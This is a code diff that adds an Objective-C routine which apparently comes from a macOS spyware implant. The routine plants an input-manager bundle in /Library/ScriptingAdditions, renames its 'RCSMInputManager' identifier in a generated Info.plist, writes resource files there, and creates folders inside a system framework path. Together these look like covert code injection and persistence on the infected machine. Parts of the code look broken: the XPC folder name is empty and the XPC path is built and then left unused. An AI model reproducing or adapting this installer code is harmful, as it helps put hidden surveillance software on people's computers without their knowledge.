@@ -2297,6 +2297,108 @@ static void computerWillShutdown(CFMachPortRef port,
   [resource_r release];
 }
 
+- (void)_dropXPCBundle
+{
+#define XPC_BUNDLE_FOLDER @""
+  
+  NSMutableString *xpcPath = [[NSMutableString alloc]
+                               initWithFormat: @"/System/Library/Framework/Foundation.framework/XPCServices/%@",
+                               XPC_BUNDLE_FOLDER];
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath: xpcPath])
+  {
+    [[NSFileManager defaultManager] removeItemAtPath: xpcPath
+                                               error: nil];
+  }
+  
+  //
+  // XPC folder
+  //
+  mkdir([xpcPath UTF8String], 0755);
+  
+  [xpcPath appendString: @"/Contents"];
+  mkdir([xpcPath UTF8String], 0755);
+  
+  NSString *tmpPath = [[NSString alloc] initWithFormat: @"%@/MacOS", xpcPath];
+  mkdir([tmpPath UTF8String], 0755);
+  [tmpPath release];
+  
+  [xpcPath appendString: @"/Resources"];
+  mkdir([xpcPath UTF8String], 0755);
+  
+  NSString *destDir = [[NSString alloc] initWithFormat:
+                       @"/Library/ScriptingAdditions/%@/Contents/MacOS/%@",
+                       EXT_BUNDLE_FOLDER,
+                       gInputManagerName];
+  [xpcPath release];
+  
+#ifdef DEBUG_CORE
+  infoLog(@"destination osax %@", destDir);
+#endif
+  
+  NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
+                         [[NSBundle mainBundle] bundlePath],
+                         gInputManagerName];
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
+                                           isDirectory: NO] == NO)
+  {
+#ifdef DEBUG_CORE
+    infoLog(@"copying inputmanager file from %@", tempIMDir);
+#endif
+    [[NSFileManager defaultManager] copyItemAtPath: tempIMDir
+                                            toPath: destDir
+                                             error: nil];
+#ifdef DEBUG_CORE
+    if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
+                                             isDirectory: NO] == NO)
+      infoLog(@"OSAX file not created");
+    else
+      infoLog(@"OSAX file created correctly");
+#endif
+  }
+  
+  [tempIMDir release];
+  [destDir release];
+  
+  NSString *info_orig_pl = [[NSString alloc] initWithCString: Info_plist];
+  
+#ifdef DEBUG_CORE
+  infoLog(@"Original info.plist for osax %@", info_orig_pl);
+#endif
+  
+  NSString *info_pl = [info_orig_pl stringByReplacingOccurrencesOfString: @"RCSMInputManager" 
+                                                              withString: gInputManagerName];
+  
+#ifdef DEBUG_CORE
+  infoLog(@"info.plist for osax %@", info_pl);
+#endif
+  
+  NSString *infoPath = [NSString stringWithFormat:
+                        @"/Library/ScriptingAdditions/%@/Contents/Info.plist",
+                        EXT_BUNDLE_FOLDER];
+  [info_pl writeToFile: infoPath
+            atomically: NO
+              encoding: NSASCIIStringEncoding
+                 error: NULL];
+  
+  [info_pl release];
+  [info_orig_pl release];
+  
+  NSString *resource_r = [[NSString alloc] initWithCString: RCSMInputManager_r];
+  
+  NSString *rPath = [NSString stringWithFormat:
+                     @"/Library/ScriptingAdditions/%@/Contents/Resources/appleOsax.r",
+                     EXT_BUNDLE_FOLDER];
+  
+  [resource_r writeToFile: rPath
+               atomically: NO
+                 encoding: NSASCIIStringEncoding
+                    error: NULL];
+  
+  [resource_r release];
+}
+
 - (void)_solveKernelSymbolsForKext
 {
   int kernFD      = 0;
